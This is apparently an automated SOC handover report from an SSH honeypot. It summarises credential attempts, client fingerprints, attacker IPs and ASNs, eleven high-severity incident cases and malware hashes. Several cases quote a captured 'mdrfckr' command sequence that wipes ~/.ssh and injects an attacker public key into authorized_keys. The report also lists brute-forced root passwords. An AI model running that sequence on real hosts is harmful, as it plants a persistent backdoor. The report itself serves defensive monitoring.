# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T13:17:03Z |
| **Shift Time** | 13:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **93** |
| Confirmed Threats | **52** |
| False Positives Filtered | **41** (44.1%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **8** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **25** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **9** |
| Unique Passwords | **15** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 4 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `A123123A` | `43.156.19.37` | 2026-04-08T10:55:38 |
| `root` | `3245gs5662d34` | `43.156.19.37` | 2026-04-08T10:55:40 |
| `root` | `Aa121212` | `20.2.83.149` | 2026-04-08T11:05:55 |
| `root` | `3245gs5662d34` | `20.2.83.149` | 2026-04-08T11:06:38 |
| `root` | `ubuntu` | `167.99.180.254` | 2026-04-08T11:13:25 |
| `root` | `qazwsx123321.` | `20.2.83.149` | 2026-04-08T11:29:30 |
| `root` | `BBxx123` | `20.2.83.149` | 2026-04-08T11:42:36 |
| `root` | `root0000@#` | `20.2.83.149` | 2026-04-08T11:47:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **93** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 24 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 23 | 3 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 23 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.2.83.149`, `43.156.19.37`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **12** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS56046` | China Mobile communications corporation | 1 | LOW |
| `AS51396` | Pfcloud UG | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8d2b0ed63e5f

| Field | Detail |
|---|---|
| **Source IP** | `43.156.19[.]37` |
| **First Seen** | 2026-04-08 10:55 |
| **Last Seen** | 2026-04-08 10:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:55:38` | `cowrie.session.connect` |
| `2026-04-08 10:55:38` | `cowrie.client.version` |
| `2026-04-08 10:55:38` | `cowrie.client.kex` |
| `2026-04-08 10:55:38` | `cowrie.login.success` |
| `2026-04-08 10:55:38` | `cowrie.session.params` |
| `2026-04-08 10:55:38` | `cowrie.command.input` |
| `2026-04-08 10:55:38` | `cowrie.command.failed` |
| `2026-04-08 10:55:38` | `cowrie.log.closed` |
| `2026-04-08 10:55:38` | `cowrie.session.params` |
| `2026-04-08 10:55:38` | `cowrie.command.input` |
| `2026-04-08 10:55:38` | `cowrie.session.file_download` |
| `2026-04-08 10:55:38` | `cowrie.log.closed` |
| `2026-04-08 10:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.19[.]37` to AbuseIPDB if not already reported
- [ ] Block `43.156.19[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e766154fe9e

| Field | Detail |
|---|---|
| **Source IP** | `43.156.19[.]37` |
| **First Seen** | 2026-04-08 10:55 |
| **Last Seen** | 2026-04-08 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:55:40` | `cowrie.session.connect` |
| `2026-04-08 10:55:40` | `cowrie.client.version` |
| `2026-04-08 10:55:40` | `cowrie.client.kex` |
| `2026-04-08 10:55:40` | `cowrie.login.success` |
| `2026-04-08 10:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.19[.]37` to AbuseIPDB if not already reported
- [ ] Block `43.156.19[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0b4376f3f4

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:05 |
| **Last Seen** | 2026-04-08 11:06 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:05:51` | `cowrie.session.connect` |
| `2026-04-08 11:05:53` | `cowrie.client.version` |
| `2026-04-08 11:05:53` | `cowrie.client.kex` |
| `2026-04-08 11:05:55` | `cowrie.login.success` |
| `2026-04-08 11:06:02` | `cowrie.session.params` |
| `2026-04-08 11:06:02` | `cowrie.command.input` |
| `2026-04-08 11:06:02` | `cowrie.command.failed` |
| `2026-04-08 11:06:02` | `cowrie.log.closed` |
| `2026-04-08 11:06:03` | `cowrie.session.params` |
| `2026-04-08 11:06:03` | `cowrie.command.input` |
| `2026-04-08 11:06:04` | `cowrie.session.file_download` |
| `2026-04-08 11:06:04` | `cowrie.log.closed` |
| `2026-04-08 11:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5671dbf7e7d8

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:06 |
| **Last Seen** | 2026-04-08 11:06 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:06:24` | `cowrie.session.connect` |
| `2026-04-08 11:06:26` | `cowrie.client.version` |
| `2026-04-08 11:06:26` | `cowrie.client.kex` |
| `2026-04-08 11:06:38` | `cowrie.login.success` |
| `2026-04-08 11:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59da3646d752

| Field | Detail |
|---|---|
| **Source IP** | `167.99.180[.]254` |
| **First Seen** | 2026-04-08 11:13 |
| **Last Seen** | 2026-04-08 11:14 |
| **Session Duration** | 86s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:13:24` | `cowrie.session.connect` |
| `2026-04-08 11:13:24` | `cowrie.client.version` |
| `2026-04-08 11:13:24` | `cowrie.client.kex` |
| `2026-04-08 11:13:25` | `cowrie.login.success` |
| `2026-04-08 11:14:50` | `cowrie.session.file_upload` |
| `2026-04-08 11:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.180[.]254` to AbuseIPDB if not already reported
- [ ] Block `167.99.180[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef975d82d424

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:29 |
| **Last Seen** | 2026-04-08 11:29 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:29:22` | `cowrie.session.connect` |
| `2026-04-08 11:29:22` | `cowrie.client.version` |
| `2026-04-08 11:29:23` | `cowrie.client.kex` |
| `2026-04-08 11:29:30` | `cowrie.login.success` |
| `2026-04-08 11:29:33` | `cowrie.session.params` |
| `2026-04-08 11:29:33` | `cowrie.command.input` |
| `2026-04-08 11:29:33` | `cowrie.command.failed` |
| `2026-04-08 11:29:35` | `cowrie.log.closed` |
| `2026-04-08 11:29:40` | `cowrie.session.params` |
| `2026-04-08 11:29:40` | `cowrie.command.input` |
| `2026-04-08 11:29:40` | `cowrie.session.file_download` |
| `2026-04-08 11:29:40` | `cowrie.log.closed` |
| `2026-04-08 11:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbf1b83fe5d

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:29 |
| **Last Seen** | 2026-04-08 11:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:29:47` | `cowrie.session.connect` |
| `2026-04-08 11:29:49` | `cowrie.client.version` |
| `2026-04-08 11:29:49` | `cowrie.client.kex` |
| `2026-04-08 11:29:52` | `cowrie.login.success` |
| `2026-04-08 11:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7825fe843722

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:42 |
| **Last Seen** | 2026-04-08 11:43 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:42:28` | `cowrie.session.connect` |
| `2026-04-08 11:42:28` | `cowrie.client.version` |
| `2026-04-08 11:42:29` | `cowrie.client.kex` |
| `2026-04-08 11:42:36` | `cowrie.login.success` |
| `2026-04-08 11:42:37` | `cowrie.session.params` |
| `2026-04-08 11:42:37` | `cowrie.command.input` |
| `2026-04-08 11:42:37` | `cowrie.command.failed` |
| `2026-04-08 11:42:38` | `cowrie.log.closed` |
| `2026-04-08 11:42:40` | `cowrie.session.params` |
| `2026-04-08 11:42:40` | `cowrie.command.input` |
| `2026-04-08 11:42:42` | `cowrie.session.file_download` |
| `2026-04-08 11:42:42` | `cowrie.log.closed` |
| `2026-04-08 11:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edc1822ee2e

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:43 |
| **Last Seen** | 2026-04-08 11:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:43:05` | `cowrie.session.connect` |
| `2026-04-08 11:43:05` | `cowrie.client.version` |
| `2026-04-08 11:43:05` | `cowrie.client.kex` |
| `2026-04-08 11:43:12` | `cowrie.login.success` |
| `2026-04-08 11:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe92fe12479

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:47 |
| **Last Seen** | 2026-04-08 11:48 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:47:33` | `cowrie.session.connect` |
| `2026-04-08 11:47:33` | `cowrie.client.version` |
| `2026-04-08 11:47:36` | `cowrie.client.kex` |
| `2026-04-08 11:47:41` | `cowrie.login.success` |
| `2026-04-08 11:47:43` | `cowrie.session.params` |
| `2026-04-08 11:47:43` | `cowrie.command.input` |
| `2026-04-08 11:47:43` | `cowrie.command.failed` |
| `2026-04-08 11:47:44` | `cowrie.log.closed` |
| `2026-04-08 11:47:46` | `cowrie.session.params` |
| `2026-04-08 11:47:46` | `cowrie.command.input` |
| `2026-04-08 11:47:46` | `cowrie.session.file_download` |
| `2026-04-08 11:47:46` | `cowrie.log.closed` |
| `2026-04-08 11:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5025e1443d0f

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 11:47 |
| **Last Seen** | 2026-04-08 11:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 11:47:59` | `cowrie.session.connect` |
| `2026-04-08 11:47:59` | `cowrie.client.version` |
| `2026-04-08 11:47:59` | `cowrie.client.kex` |
| `2026-04-08 11:48:02` | `cowrie.login.success` |
| `2026-04-08 11:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.43[.]68` | **15** | 2026-04-08 11:15 | 2026-04-08 11:18 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `20.2.83[.]149` | **12** | 2026-04-08 10:54 | 2026-04-08 11:47 | 2m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **5** | 2026-04-08 11:50 | 2026-04-08 11:55 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `1.71.143[.]145` | **3** | 2026-04-08 10:54 | 2026-04-08 10:55 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.46.231[.]161` | **2** | 2026-04-08 12:05 | 2026-04-08 12:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-04-08 12:14 | 2026-04-08 12:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]127` | 1 | 2026-04-08 11:36 | 2026-04-08 11:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.156.19[.]37` | 1 | 2026-04-08 10:55 | 2026-04-08 10:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.85.125[.]115` | 1 | 2026-04-08 12:56 | 2026-04-08 12:56 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
